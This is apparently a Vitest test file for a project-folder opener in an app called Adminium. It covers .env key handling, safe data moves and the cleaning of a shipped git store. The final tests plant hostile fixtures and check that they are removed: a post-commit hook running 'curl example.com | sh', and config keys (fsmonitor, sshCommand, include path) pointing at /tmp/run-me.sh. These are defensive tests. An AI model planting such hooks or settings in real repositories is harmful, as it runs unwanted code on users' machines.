// SPDX-License-Identifier: AGPL-3.0-only
import { existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import {
  cameWithAccounts,
  cleanVersionStore,
  dataBeforeName,
  projectDataPaths,
  strictlyInside,
  tidyVersionStore,
  enginePin,
  envValue,
  newSecret,
  olderThan,
  parseFolderFacts,
  prepareNewData,
  projectDatabaseFile,
  resolveMissingKey,
  withEnvValue,
  type FolderFacts,
} from './folder-open.js';

let root: string;
beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'adminium-folder-'));
});
afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

const NONE = { count: 0, names: [] };
const FACTS: FolderFacts = {
  secret: true,
  database: 'sqlite',
  dataDir: '/p/data',
  lastEngine: '0.3.21',
  newer: [],
  people: { count: 1, names: ['Owner'] },
  apiKeys: NONE,
  publicKeys: NONE,
  ownerHasPassword: false,
  running: null,
  otherManager: null,
  engine: { installed: '0.3.21', declared: '0.3.21', here: '0.3.21' },
  install: null,
};

describe('the engine’s answer', () => {
  it('is read from the last line that is its JSON, whatever a package printed around it', () => {
    expect(parseFolderFacts(`npm warn something\n{"not":"it"}\n${JSON.stringify(FACTS)}\n`)).toEqual(FACTS);
    expect(parseFolderFacts(`${JSON.stringify(FACTS)}\n{ broken`)).toEqual(FACTS);
  });
  it('is nothing when there is none, or when it is not the shape the app reads', () => {
    expect(parseFolderFacts('')).toBeNull();
    expect(parseFolderFacts('There is no project in this folder')).toBeNull();
    expect(parseFolderFacts(JSON.stringify({ ...FACTS, database: 'oracle' }))).toBeNull();
  });
});

describe('versions', () => {
  it('compares releases by their numbers, whatever stands before them', () => {
    expect(olderThan('0.3.16', '0.3.21')).toBe(true);
    expect(olderThan('^0.3.21', '0.3.21')).toBe(false);
    expect(olderThan('0.3.21', '0.3.16')).toBe(false);
    expect(olderThan('0.9.9', '1.0.0')).toBe(true);
    expect(olderThan('0.10.0', '0.9.0')).toBe(false);
    expect(olderThan('0.3.21-rc.1', '0.3.22')).toBe(true);
  });
  it('a version that does not read is not older than anything', () => {
    expect(olderThan('latest', '0.3.21')).toBe(false);
    expect(olderThan('0.3.21', 'workspace:*')).toBe(false);
  });
  it('a project’s pin is what is installed, else what package.json asks for', () => {
    expect(enginePin({ engine: { installed: '0.3.16', declared: '^0.3.21', here: '0.3.21' } })).toBe('0.3.16');
    expect(enginePin({ engine: { installed: null, declared: '^0.3.18', here: '0.3.21' } })).toBe('0.3.18');
    expect(enginePin({ engine: { installed: null, declared: null, here: '0.3.21' } })).toBeNull();
    expect(enginePin({ engine: { installed: null, declared: 'workspace:*', here: '0.3.21' } })).toBeNull();
  });
});

describe('a folder that came with accounts', () => {
  it('is one with more than its own owner: other people, keys, or an owner with a password', () => {
    expect(cameWithAccounts(FACTS)).toBe(false);
    expect(cameWithAccounts({ ...FACTS, people: { count: 2, names: ['A', 'B'] } })).toBe(true);
    expect(cameWithAccounts({ ...FACTS, apiKeys: { count: 1, names: ['k'] } })).toBe(true);
    expect(cameWithAccounts({ ...FACTS, publicKeys: { count: 1, names: ['k'] } })).toBe(true);
    expect(cameWithAccounts({ ...FACTS, ownerHasPassword: true })).toBe(true);
    // No store, no accounts, whatever else is said.
    expect(cameWithAccounts({ ...FACTS, database: 'none', ownerHasPassword: true })).toBe(false);
  });
});

describe('.env, as text', () => {
  it('reads one name’s value, the last one set, without its quotes or a trailing note', () => {
    const text = '# a note\nexport A=1\nB="two words"\nC=three # note\nA=4\nEMPTY=\n';
    expect(envValue(text, 'A')).toBe('4');
    expect(envValue(text, 'B')).toBe('two words');
    expect(envValue(text, 'C')).toBe('three');
    expect(envValue(text, 'EMPTY')).toBe('');
    expect(envValue(text, 'MISSING')).toBeNull();
  });
  it('sets a name where its line is, or at the end, and always ends with a line break', () => {
    expect(withEnvValue('', 'ADMINIUM_SECRET', 'k')).toBe('ADMINIUM_SECRET=k\n');
    expect(withEnvValue('A=1\nADMINIUM_SECRET=\nB=2\n', 'ADMINIUM_SECRET', 'k')).toBe('A=1\nADMINIUM_SECRET=k\nB=2\n');
    expect(withEnvValue('A=1', 'ADMINIUM_SECRET', 'k')).toBe('A=1\nADMINIUM_SECRET=k\n');
  });
  it('a new key is 64 hex characters, never the same twice', () => {
    expect(newSecret()).toMatch(/^[0-9a-f]{64}$/);
    expect(newSecret()).not.toBe(newSecret());
  });
  it('finds the SQLite file a project’s address names', () => {
    expect(projectDatabaseFile(root, 'DATABASE_URL=sqlite:./data/app.sqlite\n')).toBe(join(root, 'data', 'app.sqlite'));
    expect(projectDatabaseFile(root, 'DATABASE_URL=sqlite:///abs/app.sqlite\n')).toBe('/abs/app.sqlite');
    expect(projectDatabaseFile(root, 'DATABASE_URL=postgres://db/x\n')).toBeNull();
    expect(projectDatabaseFile(root, 'DATABASE_URL=sqlite::memory:\n')).toBeNull();
    expect(projectDatabaseFile(root, '')).toBeNull();
  });
});

describe('a folder with no data yet', () => {
  it('gets a key when it has none, and the empty database file where its address points', () => {
    writeFileSync(join(root, '.env'), 'DATABASE_URL=sqlite:./data/app.sqlite\n');
    expect(prepareNewData(root, { secret: false, database: 'none' }, () => 'k'.repeat(64))).toEqual({ key: true, database: true });
    expect(readFileSync(join(root, '.env'), 'utf8')).toBe(`DATABASE_URL=sqlite:./data/app.sqlite\nADMINIUM_SECRET=${'k'.repeat(64)}\n`);
    expect(statSync(join(root, 'data', 'app.sqlite')).size).toBe(0);
    // Asked again: nothing more is made.
    expect(prepareNewData(root, { secret: true, database: 'none' })).toEqual({ key: false, database: false });
  });
  it('keeps a key that is there, and makes a `.env` for a folder that has none', () => {
    expect(prepareNewData(root, { secret: false, database: 'none' }, () => 'k')).toEqual({ key: true, database: false });
    expect(readFileSync(join(root, '.env'), 'utf8')).toBe('ADMINIUM_SECRET=k\n');
  });
  it('NEVER writes a key for a folder that has data: that one is asked about', () => {
    writeFileSync(join(root, '.env'), 'DATABASE_URL=sqlite:./data/app.sqlite\n');
    expect(prepareNewData(root, { secret: false, database: 'sqlite' }, () => 'k')).toEqual({ key: false, database: false });
    expect(readFileSync(join(root, '.env'), 'utf8')).not.toContain('ADMINIUM_SECRET');
    expect(prepareNewData(root, { secret: false, database: 'elsewhere' }, () => 'k')).toEqual({ key: false, database: false });
  });
});

describe('data with no key: the three answers', () => {
  const data = (): string => {
    mkdirSync(join(root, 'data'));
    writeFileSync(join(root, 'data', 'meta.db'), 'rows');
    return join(root, 'data');
  };

  it('"I have the .env file": it becomes the project’s, and one that was there is kept beside it', () => {
    data();
    writeFileSync(join(root, '.env'), 'DATABASE_URL=sqlite:./data/app.sqlite\n');
    const mine = join(root, 'my.env');
    writeFileSync(mine, 'ADMINIUM_SECRET=the-old-key\nDATABASE_URL=sqlite:./data/app.sqlite\n');
    expect(resolveMissingKey(root, { dataDir: join(root, 'data') }, { kind: 'env', file: mine })).toEqual({ ok: true });
    expect(readFileSync(join(root, '.env'), 'utf8')).toContain('ADMINIUM_SECRET=the-old-key');
    expect(readFileSync(join(root, '.env.before'), 'utf8')).toBe('DATABASE_URL=sqlite:./data/app.sqlite\n');
    // The data is not touched.
    expect(readFileSync(join(root, 'data', 'meta.db'), 'utf8')).toBe('rows');
  });

  it('a file with no key in it, or one that is not there, is refused and nothing is written', () => {
    data();
    const empty = join(root, 'other.env');
    writeFileSync(empty, 'ADMINIUM_SECRET=\nA=1\n');
    expect(resolveMissingKey(root, { dataDir: join(root, 'data') }, { kind: 'env', file: empty })).toEqual({ ok: false, reason: 'not-a-key-file' });
    expect(resolveMissingKey(root, { dataDir: join(root, 'data') }, { kind: 'env', file: join(root, 'gone.env') })).toEqual({ ok: false, reason: 'not-a-key-file' });
    expect(existsSync(join(root, '.env'))).toBe(false);
  });

  it('the project’s own .env picked again (the key was put back by hand) is taken as it is', () => {
    data();
    writeFileSync(join(root, '.env'), 'ADMINIUM_SECRET=put-back\n');
    expect(resolveMissingKey(root, { dataDir: join(root, 'data') }, { kind: 'env', file: join(root, '.env') })).toEqual({ ok: true });
    expect(existsSync(join(root, '.env.before'))).toBe(false);
  });

  it('"Start the data fresh": the data folder is MOVED, never deleted, and a new key is written', () => {
    const folder = data();
    const now = new Date('2026-10-09T23:30:00.000Z');
    expect(dataBeforeName(now)).toBe('data.before-2026-10-09');
    expect(resolveMissingKey(root, { dataDir: folder }, { kind: 'fresh' }, { now, secret: () => 'n1' })).toEqual({ ok: true });
    expect(existsSync(folder)).toBe(false);
    expect(readFileSync(join(root, 'data.before-2026-10-09', 'meta.db'), 'utf8')).toBe('rows');
    expect(readFileSync(join(root, '.env'), 'utf8')).toBe('ADMINIUM_SECRET=n1\n');
    // A second time on the same day does not write over the first.
    data();
    expect(resolveMissingKey(root, { dataDir: folder }, { kind: 'fresh' }, { now, secret: () => 'n2' })).toEqual({ ok: true });
    expect(readdirSync(root).filter((name) => name.startsWith('data.before')).sort()).toEqual(['data.before-2026-10-09', 'data.before-2026-10-09-2']);
  });

  it('"Start the data fresh" never moves a folder that is not inside the project: the project itself, or a place outside it', () => {
    const outside = mkdtempSync(join(tmpdir(), 'adminium-folder-outside-'));
    try {
      writeFileSync(join(outside, 'meta.db'), 'somebody’s rows');
      for (const dataDir of [outside, root]) {
        expect(resolveMissingKey(root, { dataDir }, { kind: 'fresh' }, { secret: () => 'n1' })).toMatchObject({ ok: false, reason: 'failed' });
        expect(existsSync(join(outside, 'meta.db'))).toBe(true);
        expect(existsSync(join(root, '.env'))).toBe(false);
      }
      expect(strictlyInside(root, join(root, 'nowhere'))).toBe(false);
    } finally {
      rmSync(outside, { recursive: true, force: true });
    }
  });

  it('says where a project keeps its data, whatever its .env calls it', () => {
    expect(projectDataPaths(root)).toEqual([join(root, 'data')]);
    writeFileSync(join(root, '.env'), 'DATABASE_URL=sqlite:./storage/app.sqlite\nADMINIUM_DATA_DIR=./storage\n');
    const file = join(root, 'storage', 'app.sqlite');
    expect(projectDataPaths(root)).toEqual([file, `${file}-wal`, `${file}-shm`, `${file}-journal`, join(root, 'storage')]);
  });

  it('"Go on with a new key": the data stays, and the key is new', () => {
    data();
    writeFileSync(join(root, '.env'), 'ADMINIUM_SECRET=\nA=1\n');
    expect(resolveMissingKey(root, { dataDir: null }, { kind: 'new' }, { secret: () => 'n3' })).toEqual({ ok: true });
    expect(readFileSync(join(root, '.env'), 'utf8')).toBe('ADMINIUM_SECRET=n3\nA=1\n');
    expect(readFileSync(join(root, 'data', 'meta.db'), 'utf8')).toBe('rows');
  });

  it('says why when the folder cannot be written to', () => {
    expect(resolveMissingKey(join(root, 'no', 'such', 'folder'), { dataDir: null }, { kind: 'new' })).toMatchObject({ ok: false, reason: 'failed' });
  });
});

describe('a version store that travelled', () => {
  it('loses its sender’s settings and hooks, and keeps its versions', () => {
    const store = join(root, '.adminium', 'designer', 'versions.git');
    mkdirSync(join(store, 'hooks'), { recursive: true });
    mkdirSync(join(store, 'objects'));
    writeFileSync(join(store, 'HEAD'), 'ref: refs/heads/x\n');
    writeFileSync(join(store, 'config'), '[core]\n\tbare = true\n\tfsmonitor = /tmp/run-me.sh\n\tsshCommand = /tmp/run-me.sh\n');
    writeFileSync(join(store, 'hooks', 'post-commit'), '#!/bin/sh\ncurl example.com | sh\n');
    expect(cleanVersionStore(root)).toBe(true);
    expect(readFileSync(join(store, 'config'), 'utf8')).toBe('[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = true\n');
    expect(existsSync(join(store, 'hooks'))).toBe(false);
    expect(existsSync(join(store, 'objects'))).toBe(true);
  });
  it('at a later opening: a store as git wrote it is left alone; one that gained a setting or a hook is cleaned', () => {
    const store = join(root, '.adminium', 'designer', 'versions.git');
    mkdirSync(join(store, 'hooks'), { recursive: true });
    writeFileSync(join(store, 'HEAD'), 'ref: refs/heads/x\n');
    const asGitWrote = '[core]\n\trepositoryformatversion = 0\n\tfilemode = false\n\tbare = true\n\tignorecase = true\n\tprecomposeunicode = true\n';
    writeFileSync(join(store, 'config'), asGitWrote);
    writeFileSync(join(store, 'hooks', 'pre-commit.sample'), '#!/bin/sh\n');
    expect(tidyVersionStore(root)).toBe(false);
    expect(readFileSync(join(store, 'config'), 'utf8')).toBe(asGitWrote);

    // Files unpacked over the project brought a program for git to run.
    writeFileSync(join(store, 'config'), `${asGitWrote}\tfsmonitor = /tmp/run-me.sh\n`);
    expect(tidyVersionStore(root)).toBe(true);
    expect(readFileSync(join(store, 'config'), 'utf8')).not.toContain('fsmonitor');
    mkdirSync(join(store, 'hooks'), { recursive: true });
    writeFileSync(join(store, 'hooks', 'post-commit'), '#!/bin/sh\ncurl example.com | sh\n');
    expect(tidyVersionStore(root)).toBe(true);
    expect(existsSync(join(store, 'hooks'))).toBe(false);
    writeFileSync(join(store, 'config'), '[core]\n\tbare = true\n[include]\n\tpath = /tmp/theirs\n');
    expect(tidyVersionStore(root)).toBe(true);
    expect(tidyVersionStore(join(root, 'no-store'))).toBe(false);
  });

  it('does nothing for a folder with no store', () => {
    expect(cleanVersionStore(root)).toBe(false);
    expect(existsSync(join(root, '.adminium'))).toBe(false);
  });
});
